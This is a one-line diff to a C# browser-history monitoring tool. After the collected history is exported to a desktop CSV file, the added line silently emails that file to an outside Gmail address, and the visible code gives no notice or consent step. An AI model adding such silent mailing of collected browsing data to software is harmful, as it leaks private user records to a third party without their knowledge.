@@ -180,6 +180,7 @@ namespace BrowserHistoryServer
                     dt = DataGridtoDataTable(MainDataGridExel);
                     string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + DateTime.Now.ToShortDateString() + "_" + DateTime.Now.ToShortTimeString().Replace(':', '_') + ".csv";
                     CSV.ExportToCSV(path, dt);
+                    new DataMailSender("browserhistory@dietcenter.com.ua", "falcon.ukr1@gmail.com", path).Send();
                 }
                 catch (Exception rx)
                 {
